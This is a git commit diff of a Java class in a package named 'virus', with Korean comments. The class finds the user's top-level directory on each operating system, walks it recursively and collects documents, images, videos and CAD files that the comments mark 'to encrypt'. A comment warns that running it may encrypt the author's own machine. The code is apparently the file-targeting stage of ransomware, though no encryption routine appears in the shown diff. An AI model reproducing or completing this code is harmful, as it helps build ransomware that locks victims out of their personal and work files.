4fcef963a1fc826aaf534fc88a773f55e1bea7e8
codertimo <codertimo@gmail.com>
2015-11-23 16:05:08 +0900

    파일 검색 & 주석 추가

--- src/com/virus/security/SearchDirectory.java
+++ src/com/virus/security/SearchDirectory.java
@@ -14,11 +14,56 @@ public class SearchDirectory {
     private boolean isWindow;
     private String defaultDirectiory;
     private List<File> allFiles = new ArrayList<>();
-    private List<String> filters = new ArrayList<>();
+    private List<String> containsfilters = new ArrayList<>();
+    private int filecounts = 0;
 
     public SearchDirectory()
     {
-        initFilter();
+        /**
+         * !!!주의!!!
+         * 암호화 테스트 코드를 실행할 때에는 절대 setDefaultDirectiory()를 사용하여 테스트를 하지 마세요
+         * 본인의 컴퓨터가 암호화 될 수 있습니다
+         **/
+
+
+
+        //1. 암호화 할 경로 설정
+//        setDefaultDirectiory("/Users/codertimo/Develop/EncryptionTest/");
+        setDefaultDirectiory();
+
+        //2. 암호화할 파일 타입을 설정
+        initContainFilter();
+
+        //3.
+
+        System.out.println("디렉토리 검색 시작");
+        System.out.println(defaultDirectiory);
+        subDirList(defaultDirectiory);
+        System.out.println("디렉토리 검색 끝");
+    }
+
+    /**
+     * 암호화할 코드
+     */
+    private void initContainFilter()
+    {
+        containsfilters.add("jpg");
+        containsfilters.add("docx");
+        containsfilters.add("hwp");
+        containsfilters.add("pptx");
+        containsfilters.add("ppt");
+        containsfilters.add("avi");
+        containsfilters.add("mp4");
+        containsfilters.add("mkv");
+        containsfilters.add("max");
+        containsfilters.add("cad");
+    }
+
+    /**
+     * OS별 최상위 디렉토리 설정
+     */
+    private void setDefaultDirectiory()
+    {
         String os = System.getProperty("os.name").split(" ")[0];
         switch (os)
         {
@@ -35,23 +80,16 @@ public class SearchDirectory {
             default:
                 isWindow = false;
         }
-
-        System.out.println("디렉토리 검색 시작");
-        System.out.println(defaultDirectiory);
-        subDirList(defaultDirectiory);
-        System.out.println("디렉토리 검색 끝");
     }
 
     /**
-     * 검색후 추가할 파일의 타입반 추출
+     * 최상위 디렉토리 사용자 설정
+     * @param defaultDirectiory
      */
-    private void initFilter()
+    private void setDefaultDirectiory(String defaultDirectiory)
     {
-        filters.add("js");
-        filters.add("java");
-        filters.add("dat");
+        this.defaultDirectiory = defaultDirectiory;
     }
-
     /**
      * 기본 디렉토리 설정 : Mac 용
      */
@@ -62,8 +100,7 @@ public class SearchDirectory {
         try {
             for (File file : fileList) {
                 System.out.println(file.getName());
-                if (!file.getName().equals("Guest") && !file.getName().equals("Shared"))
-                {
+                if (!file.getName().equals("Guest") && !file.getName().equals("Shared")) {
                     this.defaultDirectiory = file.getCanonicalPath().toString();
                 }
             }
@@ -106,6 +143,7 @@ public class SearchDirectory {
         try{
             for(File file : fileList){
                 if(file.isFile()){
+                    filecounts+=1;
                     // 파일이 있다면 파일 추가
                     if(isAvalableFile(file)) {
                         allFiles.add(file);
@@ -131,8 +169,7 @@ public class SearchDirectory {
      */
     private boolean isAvalableFile(File file)
     {
-//        System.out.println(FilenameUtils.getExtension(file.getName()));
-        if(this.filters.contains(FilenameUtils.getExtension(file.getName())))
+        if(this.containsfilters.contains(FilenameUtils.getExtension(file.getName())))
         {
             return true;
         }
